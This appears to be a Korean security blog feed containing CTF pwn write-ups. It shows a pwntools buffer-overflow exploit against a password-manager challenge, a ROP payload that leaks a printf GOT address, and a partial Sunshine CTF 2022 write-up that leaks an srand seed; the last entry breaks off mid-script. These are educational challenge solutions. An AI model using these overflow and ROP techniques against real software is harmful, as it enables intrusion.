password&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3) Chage name&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;0) Exit&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> changeName();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> readPass();</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Bye Bye.... &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        result = addPass();</span><br><span class="line">        encrypted = result;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try again...&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> menu();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>menu 함수는 while을 통해 무한히 실행된다. 여기서 주목해야할 것이 3번메뉴 changeName 함수와 1번 메뉴 addPass 함수이다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">changeName</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your name is &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(username);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please type your name: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, username, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your new name: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(username); <span class="comment">// fsb</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>먼저 changeName 함수. 대놓고 fsb가 터진다. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">addPass</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> src[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-230h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+100h] [rbp-130h] BYREF</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">44</span>]; <span class="comment">// [rsp+200h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+22Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( buf[i] == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      src[i] = <span class="number">10</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    src[i] = key[i % <span class="number">8</span>] ^ buf[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src); <span class="comment">// bof</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strncpy</span>(&amp;encrypted, dest, <span class="number">0x1F</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>addPass 함수. dest 크기가 44인데 여기다가 256 크기의 src를 복사한다. 대놓고 bof가 터지고 pie도 없다. flag를 출력해주는 함수도 존재하니 바로 흐름을 돌려주면 된다. 하지만 이 전에 src를 가공하니 exploit을 작성할 때 유의해줘야 한다. </p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>strcpy 함수는 복사할 때 길이 검증을 하지 않아 bof 발생 가능성이 존재한다. 이 문제에서 이로 인해 함수 흐름을 변경할 수 있는 가능성이 존재한다.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol><li>key 값 leak</li><li>payload 작성 후 addPass 함수의 로직 구현</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>, <span class="number">12367</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;AAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Key: \r\n&#x27;</span>)</span><br><span class="line">key = p.recvline()[:-<span class="number">2</span>]</span><br><span class="line">info(key)</span><br><span class="line"></span><br><span class="line"><span class="comment">#============</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;it\r\n&#x27;, str(3))</span></span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;name:&#x27;, b&#x27;%7$p&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil(&#x27;: &#x27;)</span></span><br><span class="line"><span class="comment"># e.address = int(p.recv(14), 16) - 0x1543</span></span><br><span class="line"><span class="comment"># info(hex(e.address))</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;it\r\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">buf = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">buf += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x30</span>+<span class="number">0x8</span>)</span><br><span class="line">buf += p64(<span class="number">0x40162d</span>)</span><br><span class="line">buf += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(key))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(buf))</span><br><span class="line">src = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="keyword">if</span> buf[i] == <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment">#src[i] = key[i%8] ^ buf[i]</span></span><br><span class="line">    src.append(key[i%<span class="number">8</span>] ^ buf[i])</span><br><span class="line">    </span><br><span class="line">src = <span class="built_in">bytes</span>(src)</span><br><span class="line">p.sendline(src)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="python3-bytes"><a href="#python3-bytes" class="headerlink" title="python3 bytes"></a>python3 bytes</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>src = []</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>src.append(<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>src.append(<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>src.append(<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>src</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">bytes</span>(src)</span><br><span class="line"><span class="string">b&#x27;\x01\x02\x03&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hmmm...1_7h0u6h7_17_15_53cur3&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Why GOT is not printed clearly when using printf</title>
      <link href="/221202-why_got_is_not_printed_clearly_when_using_printf/"/>
      <url>/221202-why_got_is_not_printed_clearly_when_using_printf/</url>
      
        <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>32bit 워게임 프로그램에서 GOT를 출력하고자 했을 때 4바이트가 출력되지 않고 그 이상의 값이 출력되었다. 그 이유는 leak할 때 사용한 <code>printf</code> 함수는 null byte를 만나기 전까지 출력하기 때문이다.</p><h2 id="Why-GOT-is-not-printed-clearly-when-using-printf"><a href="#Why-GOT-is-not-printed-clearly-when-using-printf" class="headerlink" title="Why GOT is not printed clearly when using printf"></a>Why GOT is not printed clearly when using printf</h2><h3 id="printf를-사용하여-GOT를-print-leak-할-때-명확하게-되지-않는-이유"><a href="#printf를-사용하여-GOT를-print-leak-할-때-명확하게-되지-않는-이유" class="headerlink" title="printf를 사용하여 GOT를 print(leak)할 때 명확하게 되지 않는 이유"></a>printf를 사용하여 GOT를 print(leak)할 때 명확하게 되지 않는 이유</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x2c</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(e.plt[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p32(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">payload += p32(e.got[<span class="string">&#x27;printf&#x27;</span>])</span><br></pre></td></tr></table></figure><p>32bit 워게임 문제를 풀다가 rop를 해야하는 상황이 있었다. libc system 함수 실제 주소를 구하기 위해 <code>printf@got</code>를 leak하려고 했는데 4바이트 이상의 바이트가 아래와 같이 출력되었다. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0\x0f\xf7М\xc7\xf7\x96\x8`\xf1\xc1\xf7\x908\xc7\xf7\xc0p\xc3\xf7</span><br></pre></td></tr></table></figure><p><code>atoi@got</code>는 깔끔하게 4바이트가 출력되었는데 <code>printf@got</code>는 4바이트 이상의 문자열이 출력되는 것이 이상하다고 생각되어서 디버깅을 해보았다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; der $_got()</span><br><span class="line">0x8049ffc│+0x0000:  add BYTE PTR [eax], al</span><br><span class="line">0x804a000│+0x0004: 0x8049f14  →  &lt;_DYNAMIC+0&gt; add DWORD PTR [eax], eax</span><br><span class="line">0x804a004│+0x0008: 0xf7f0ea20  →  0x00000000</span><br><span class="line">0x804a008│+0x000c: 0xf7eebc00  →   endbr32</span><br><span class="line">0x804a00c│+0x0010: 0xf7c50f30  →  &lt;printf+0&gt; endbr32</span><br><span class="line">0x804a010│+0x0014: 0xf7c79cd0  →  &lt;getchar+0&gt; endbr32</span><br><span class="line">0x804a014│+0x0018: 0x8048396  →  &lt;__gmon_start__@plt+6&gt; push 0x10</span><br><span class="line">0x804a018│+0x001c: 0xf7c1f160  →  &lt;__libc_start_main+0&gt; endbr32</span><br><span class="line">0x804a01c│+0x0020: 0xf7c73890  →  &lt;setvbuf+0&gt; endbr32</span><br><span class="line">0x804a020│+0x0024: 0xf7c370c0  →  &lt;atoi+0&gt; endbr32</span><br></pre></td></tr></table></figure><p><code>0x804a00c</code> 주소를 출력하면 <code>0xf7c50f30</code>가 깔끔하게 print(leak) 될 줄 알았다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; print-format -l 40 --bitlen 8 --lang py 0x804a00c</span><br><span class="line">buf = [0x30, 0xf, 0xc5, 0xf7, 0xd0, 0x9c, 0xc7, 0xf7, 0x96, 0x83, 0x4, 0x8, 0x60, 0xf1, 0xc1, 0xf7, 0x90, 0x38, 0xc7, 0xf7, 0xc0, 0x70, 0xc3, 0xf7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>buf = [<span class="number">0x30</span>, <span class="number">0xf</span>, <span class="number">0xc5</span>, <span class="number">0xf7</span>, <span class="number">0xd0</span>, <span class="number">0x9c</span>, <span class="number">0xc7</span>, <span class="number">0xf7</span>, <span class="number">0x96</span>, <span class="number">0x83</span>, <span class="number">0x4</span>, <span class="number">0x8</span>, <span class="number">0x60</span>, <span class="number">0xf1</span>, <span class="number">0xc1</span>, <span class="number">0xf7</span>, <span class="number">0x90</span>, <span class="number">0x38</span>, <span class="number">0xc7</span>, <span class="number">0xf7</span>, <span class="number">0xc0</span>, <span class="number">0x70</span>, <span class="number">0xc3</span>, <span class="number">0xf7</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">bytes</span>(buf)</span><br><span class="line"><span class="string">b&#x27;0\x0f\xc5\xf7\xd0\x9c\xc7\xf7\x96\x83\x04\x08`\xf1\xc1\xf7\x908\xc7\xf7\xc0p\xc3\xf7&#x27;</span></span><br></pre></td></tr></table></figure><p>하지만 내가 함수 주소 leak하는 코드를 <code>printf</code> 함수를 이용했기 때문에 null byte까지 출력하는 <code>printf</code> 함수 특성에 의해 4바이트 이상이 출력이 된다. </p><p><code>atoi@got</code> 같은 경우에는 바로 뒤가 null byte였기 때문에 4바이트가 깔끔하게 출력된 것이었다. </p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> printf </tag>
            
            <tag> GOT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sunshine CTF 2022 - CTF Simulator (srand)</title>
      <link href="/221127-sunshine2022-ctf_simulator/"/>
      <url>/221127-sunshine2022-ctf_simulator/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(74&#x2F;445) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>Step right up and compete to improve your guessing CTF skills!</p><p>nc sunshinectf.games 22000</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">└── ctf-simulator</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf-simulator: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8095b13ea4b618e9e704441f0d78b2e9989b5d14, for GNU/Linux 3.2.0, stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>전부 다 걸려있다고 겁먹으면 안된다. 오히려 간단한 문제일 수도 있다.</p><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-98h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-94h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+14h] [rbp-8Ch]</span></span><br><span class="line">  <span class="type">char</span> *src; <span class="comment">// [rsp+18h] [rbp-88h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  <span class="type">char</span> *v10; <span class="comment">// [rsp+28h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+30h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>, a3);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> || read(fd, &amp;dest[<span class="number">0x14</span>], <span class="number">4uLL</span>) != <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Fatal error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  close(fd);</span><br><span class="line">  srand(*(_DWORD *)&amp;dest[<span class="number">0x14</span>]);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;||| CTF Simulator 2022 |||&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This CTF training simulator will hone your guessing skills so you can be more competitive in CTF competitions!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s the name of your CTF team?\n[&gt;] &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  src = sub_1349();</span><br><span class="line">  <span class="keyword">if</span> ( !src )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid team name!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strncpy</span>(dest, src, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">10</span>; i &lt;= <span class="number">999999999</span>; i *= <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Okay %s, I&#x27;m thinking of a number between 1 and %d. What is it?\n[&gt;] &quot;</span>, dest, (<span class="type">unsigned</span> <span class="type">int</span>)i);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    v7 = rand() % i + <span class="number">1</span>;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    src = sub_1349();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_sscanf(src, <span class="string">&quot;%d&quot;</span>, &amp;v4) != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bad guess!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt; v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Too low!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt; v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Too high!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;That&#x27;s it!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Wow, did you hack into my brain? Great guessing! You&#x27;ll be a CTF star in no time!&quot;</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Flag file is missing!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(s, <span class="number">100</span>, stream) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error reading from flag file!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(stream);</span><br><span class="line">  v10 = <span class="built_in">strchr</span>(s, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">    *v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s a reward for you: %s\n&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>요약하자면 <code>for ( i = 10; i &lt;= 999999999; i *= 10 )</code> 동안 랜덤한 수를 맞춰야 한다. </p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>CTF team name을 입력할 때 srand 인자 leak이 가능하다.<br><code>&amp;dest[0x14]</code>에 4바이트로 srand의 인자로 <code>/dev/urandom</code>의 랜덤한 값을 입력한다. 후에 CTF team name을 사용자에게 src에 입력받고 <code>strncpy(dest, src, 0x14uLL);</code> 에서 dest에 복사한다. printf는 공백까지 출력하기 때문에 CTF team name에 0x14를 꽉꽉 채워서 입력해주면 <code>&amp;dest[0x14]</code>도 출력할 수 있다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x55f716d94430: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x55f716d94440: 0xd9fd281441414141      0x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol><li>srand 인자 leak하는 python 코드 작성</li><li>해당 인자를 가지고 random 수를 출력하는 c 프로그램 작성</li><li>인자를 c 프로그램에 넘겨주어 random 수를 출력하는 것을 받아오는 python 코드 작성</li><li>문제 프로그램에 넘기기</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><p>&#96;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span 